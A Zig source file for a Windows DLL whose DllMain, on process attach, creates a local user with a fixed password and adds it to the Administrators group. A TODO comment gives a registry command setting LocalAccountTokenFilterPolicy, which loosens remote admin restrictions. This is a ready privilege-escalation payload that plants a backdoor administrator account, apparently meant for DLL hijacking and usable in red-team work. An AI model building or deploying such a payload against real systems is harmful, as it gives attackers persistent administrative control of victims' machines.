const win32 = @import("win32").everything;
const win32_security = @import("win32").security;
const std = @import("std");

// set log level by build type
pub const default_level: std.Level = switch (std.builtin.mode) {
    .Debug => .debug,
    .ReleaseSafe, .ReleaseFast, .ReleaseSmall => .info,
};

const windows = std.os.windows;

const WINAPI = windows.WINAPI;

const kernel32 = windows.kernel32;
extern "kernel32" fn GetLastError() callconv(WINAPI) windows.DWORD;

fn exec() windows.BOOL {
    var gpa = std.heap.DebugAllocator(.{}){};
    const allocator = gpa.allocator();
    defer _ = gpa.deinit();

    const pszUsername = std.unicode.utf8ToUtf16LeAllocZ(allocator, "username") catch {
        return .FALSE;
    };
    defer allocator.free(pszUsername);
    const pszPassword = std.unicode.utf8ToUtf16LeAllocZ(allocator, "password") catch {
        return .FALSE;
    };
    defer allocator.free(pszPassword);
    const pszGroup = std.unicode.utf8ToUtf16LeAllocZ(allocator, "Administrators") catch {
        return .FALSE;
    };
    defer allocator.free(pszGroup);

    const user_info = win32.USER_INFO_1{
        .usri1_name = pszUsername,
        .usri1_password = pszPassword,
        .usri1_password_age = 0,
        .usri1_priv = win32.USER_PRIV_USER,
        .usri1_home_dir = null,
        .usri1_comment = null,
        .usri1_flags = win32.USER_ACCOUNT_FLAGS{ .SCRIPT = 1, ._9 = 1 },
        .usri1_script_path = null,
    };

    // https://learn.microsoft.com/en-us/windows/win32/api/lmaccess/nf-lmaccess-netuseradd
    // NET_API_STATUS NET_API_FUNCTION NetUserAdd(
    var ret = win32.NetUserAdd(
        null,
        1,
        @ptrCast(@constCast(&std.mem.toBytes(user_info))),
        null,
    );

    if (ret != win32.NERR_Success) {
        std.log.err("NetUserAdd Failed {d} == 0x{d}", .{ ret, ret });
    }

    const group_info = win32.LOCALGROUP_MEMBERS_INFO_3{
        .lgrmi3_domainandname = pszUsername,
    };
    //

    //https://learn.microsoft.com/en-us/windows/win32/api/lmaccess/nf-lmaccess-netlocalgroupaddmembers
    // NET_API_STATUS NET_API_FUNCTION NetLocalGroupAddMembers(
    ret = win32.NetLocalGroupAddMembers(
        null,
        pszGroup,
        3,
        @ptrCast(@constCast(&std.mem.toBytes(group_info))),
        1,
    );

    if (ret != win32.NERR_Success) {
        std.log.err("NetLocalGroupAddMembers Failed {d} == 0x{d}", .{ ret, ret });
    }

    // TODO: REG ADD HKLM\Software\Microsoft\windows\CurrentVersion\Policies\system /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f

    return .TRUE;
}

pub export fn DllMain(hinstDLL: win32.HINSTANCE, fdwReason: u32, lpReserved: windows.LPVOID) windows.BOOL {
    _ = lpReserved;
    _ = hinstDLL;
    switch (fdwReason) {
        win32.DLL_PROCESS_ATTACH => {
            return exec();
        },
        win32.DLL_THREAD_ATTACH => {},
        win32.DLL_THREAD_DETACH => {},
        win32.DLL_PROCESS_DETACH => {},
        else => {},
    }

    return .TRUE;
}
